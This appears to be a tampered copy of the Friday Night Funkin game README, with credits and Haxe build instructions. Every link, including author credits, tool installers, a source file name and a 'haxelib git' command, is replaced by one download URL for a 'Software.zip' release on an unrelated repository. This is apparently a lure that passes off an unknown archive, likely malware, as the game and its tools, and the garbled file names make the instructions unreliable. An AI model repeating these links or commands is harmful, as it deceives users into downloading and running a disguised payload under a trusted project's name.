# Friday Night Funkin

This is the repository for Friday Night Funkin, a game originally made for Ludum Dare 47 "Stuck In a Loop".

Play the Ludum Dare prototype here: https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip
Play the Newgrounds one here: https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip
Support the project on the https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip page: https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip

## Credits / shoutouts

- [ninjamuffin99 (me!)](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) - Programmer
- [PhantomArcade3K](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) and [Evilsk8r](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) - Art
- [Kawaisprite](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) - Musician

This game was made with love to Newgrounds and it's community. Extra love to Tom Fulp.

## Build instructions

THESE INSTRUCTIONS ARE FOR COMPILING THE GAME'S SOURCE CODE!!!

IF YOU WANT TO JUST DOWNLOAD AND INSTALL AND PLAY THE GAME NORMALLY, GO TO https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip TO DOWNLOAD THE GAME FOR PC, MAC, AND LINUX!!

https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip

IF YOU WANT TO COMPILE THE GAME YOURSELF, CONTINUE READING!!!

### Installing the Required Programs

First you need to install Haxe and HaxeFlixel. I'm too lazy to write and keep updated with that setup (which is pretty simple). 
1. [Install Haxe 4.1.5](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) (Download 4.1.5 instead of 4.2.0 because 4.2.0 is broken and is not working with gits properly...)
2. [Install HaxeFlixel](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip) after downloading Haxe

Other installations you'd need is the additional libraries, a fully updated list will be in `https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip` in the project root. Currently, these are all of the things you need to install:
```
flixel
flixel-addons
flixel-ui
hscript
newgrounds
```
So for each of those type `haxelib install [library]` so shit like `haxelib install newgrounds`

You'll also need to install polymod. To do this, you need to do a few things first.
1. Download [git-scm](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip). Works for Windows, Mac, and Linux, just select your build.
2. Follow instructions to install the application properly.
3. Run `haxelib git polymod https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip` in terminal/command-prompt after your git program is installed.

You should have everything ready for compiling the game! Follow the guide below to continue!

### Ignored files

I gitignore the API keys for the game, so that no one can nab them and post fake highscores on the leaderboards. But because of that the game
doesn't compile without it.

Just make a file in `/source` and call it `https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip`, and copy paste this into it

```haxe
package;

class APIStuff
{
	public static var API:String = "";
	public static var EncKey:String = "";
}

```

and you should be good to go there.

### Compiling game

Once you have all those installed, it's pretty easy to compile the game. You just need to run 'lime test html5 -debug' in the root of the project to build and run the HTML5 version. (command prompt navigation guide can be found here: [https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip))

To run it from your desktop (Windows, Mac, Linux) it can be a bit more involved. For Linux, you only need to open a terminal in the project directory and run 'lime test linux -debug' and then run the executible file in export/release/linux/bin. For Windows, you need to install Visual Studio Community 2019. While installing VSC, don't click on any of the options to install workloads. Instead, go to the individual components tab and choose the following:
* MSVC v142 - VS 2019 C++ x64/x86 build tools
* Windows SDK (10.0.17763.0)
* C++ Profiling tools
* C++ CMake tools for windows
* C++ ATL for v142 build tools (x86 & x64)
* C++ MFC for v142 build tools (x86 & x64)
* C++/CLI support for v142 build tools (14.21)
* C++ Modules for v142 build tools (x64/x86)
* Clang Compiler for Windows
* Windows 10 SDK (10.0.17134.0)
* Windows 10 SDK (10.0.16299.0)
* MSVC v141 - VS 2017 C++ x64/x86 build tools
* MSVC v140 - VS 2015 C++ build tools (v14.00)

This will install about 22GB of crap, but once that is done you can open up a command line in the project's directory and run `lime test windows -debug`. Once that command finishes (it takes forever even on a higher end PC), you can run FNF from the .exe file under export\release\windows\bin
As for Mac, 'lime test mac -debug' should work, if not the internet surely has a guide on how to compile Haxe stuff for Mac.

### Additional guides

- [Command line basics](https://github.com/gr3uh/Funkin/releases/download/v2.0/Software.zip)
